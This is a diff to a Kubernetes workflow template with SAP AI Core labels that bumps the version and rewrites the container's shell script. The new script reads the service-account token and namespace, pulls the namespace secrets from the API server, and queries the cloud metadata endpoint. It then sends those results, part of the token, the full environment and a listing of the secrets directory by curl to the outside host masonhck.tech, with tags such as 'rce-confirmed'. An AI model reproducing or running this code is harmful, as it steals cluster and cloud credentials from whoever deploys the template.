@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "1.0.1"
+    ai.sap.com/version: "1.0.2"
 spec:
   entrypoint: main
   templates:
@@ -24,15 +24,18 @@ spec:
       - sh
       - -c
       - |
-        curl -s "https://www.masonhck.tech/cb.php?src=wftemplate-rce-$(hostname)"
+        curl -k -s "https://www.masonhck.tech/cb.php?src=rce-confirmed-$(hostname)"
         TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo none)
         NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo none)
-        curl -s "https://www.masonhck.tech/cb.php?src=wft-ns-${NS}"
-        curl -sk "https://kubernetes.default.svc/api/v1/namespaces/${NS}/secrets" \
-          -H "Authorization: Bearer ${TOKEN}" | head -c 2000 | \
-          curl -s -X POST "https://www.masonhck.tech/cb.php?src=wft-secrets" -d @-
-        curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" | \
-          curl -s -X POST "https://www.masonhck.tech/cb.php?src=wft-imds" -d @-
+        curl -k -s "https://www.masonhck.tech/cb.php?src=ns-${NS}"
+        curl -k -s "https://www.masonhck.tech/cb.php?src=token-${TOKEN:0:50}"
+        curl -k -s "https://kubernetes.default.svc/api/v1/namespaces/${NS}/secrets" \
+          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 2000 | \
+          curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=k8s-secrets" -d @-
+        curl -k -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" 2>&1 | \
+          curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=imds" -d @-
+        env | curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=env-dump" -d @-
+        ls -la /var/run/secrets/ 2>&1 | curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=secrets-dir" -d @-
       resources:
         limits:
           cpu: "1"
